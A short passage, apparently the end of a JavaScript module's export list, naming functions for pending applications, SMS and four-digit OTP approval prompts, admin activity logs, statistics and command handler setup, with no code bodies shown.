    getPendingApplications,
    sendSmsOtpApprovalPrompt,
    sendFourDigitOtpApprovalPrompt,

    logAdminActivity,
    getEnvironmentLogs,

    getAdminStats,
    getStats,
    getPerAdminStats,

    getAllAdminsDetailed,
    cleanupInvalidAdmins,

    setupCommandHandlers
};
